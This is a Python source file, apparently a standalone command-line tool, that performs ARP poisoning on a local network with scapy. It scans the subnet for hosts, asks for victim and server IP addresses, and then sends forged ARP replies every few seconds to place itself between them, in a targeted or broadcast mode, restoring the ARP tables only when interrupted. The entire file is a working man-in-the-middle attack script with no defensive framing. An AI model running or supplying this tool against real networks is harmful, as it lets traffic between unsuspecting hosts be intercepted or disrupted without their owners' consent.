from scapy.all import *
import argparse
import netifaces as ni

def get_local_ip(interface):
    try:
        return ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
    except ValueError:
        return None

def scan_ips(interface):
    local_ip = get_local_ip(interface)
    if local_ip:
        network = local_ip + "/24"
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2, verbose=False, iface=interface)
        return [res[1].psrc for _, res in ans]
    else:
        return []

def get_mac(ip, interface):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    response, _ = srp(arp_request, timeout=2, verbose=False, iface=interface)
    if response:
        return response[0][1].hwsrc

def spoof_arp(target_ip, target_mac, spoof_ip, interface, mode):
    if mode == "silent":
        arp_response = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    elif mode == "all-out":
        arp_response = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    else:
        print("Invalid mode. Supported modes: silent, all-out")
        return
    sendp(arp_response, verbose=False, iface=interface)

def restore_arp(target_ip, target_mac, spoof_ip, spoof_mac, interface):
    arp_response = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    sendp(arp_response, verbose=False, iface=interface)

def main(victim_ips, server_ips, mode, interface):
    if len(victim_ips) != len(server_ips):
        print("Number of victim IPs and server IPs should be the same.")
        return

    victim_macs = [get_mac(ip, interface) for ip in victim_ips]
    server_macs = [get_mac(ip, interface) for ip in server_ips]

    if None in victim_macs or None in server_macs:
        print("Failed to retrieve MAC addresses of the victim or server.")
        return

    try:
        print("[+] Starting ARP poisoning...")
        while True:
            for i in range(len(victim_ips)):
                spoof_arp(victim_ips[i], victim_macs[i], server_ips[i], interface, mode)
                spoof_arp(server_ips[i], server_macs[i], victim_ips[i], interface, mode)
            time.sleep(5)  # Delay between ARP spoofing packets
    except KeyboardInterrupt:
        print("\n[+] Stopping ARP poisoning and restoring ARP tables...")
        for i in range(len(victim_ips)):
            restore_arp(victim_ips[i], victim_macs[i], server_ips[i], server_macs[i], interface)
            restore_arp(server_ips[i], server_macs[i], victim_ips[i], victim_macs[i], interface)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Poisoning Script")
    parser.add_argument("-m", "--mode", choices=["silent", "all-out"], help="Operational mode (silent, all-out)", required=True)
    parser.add_argument("-i", "--interface", help="Network interface", required=True)
    args = parser.parse_args()

    interface = args.interface

    print("[+] Scanning available IP addresses...")
    ips = scan_ips(interface)
    print("[+] Available IP addresses:")
    for ip in ips:
        print(ip)

    victim_ips = raw_input("Enter victim IP(s) (space-separated): ").split()
    server_ips = raw_input("Enter server IP(s) (space-separated): ").split()

    mode = args.mode

    main(victim_ips, server_ips, mode, interface)

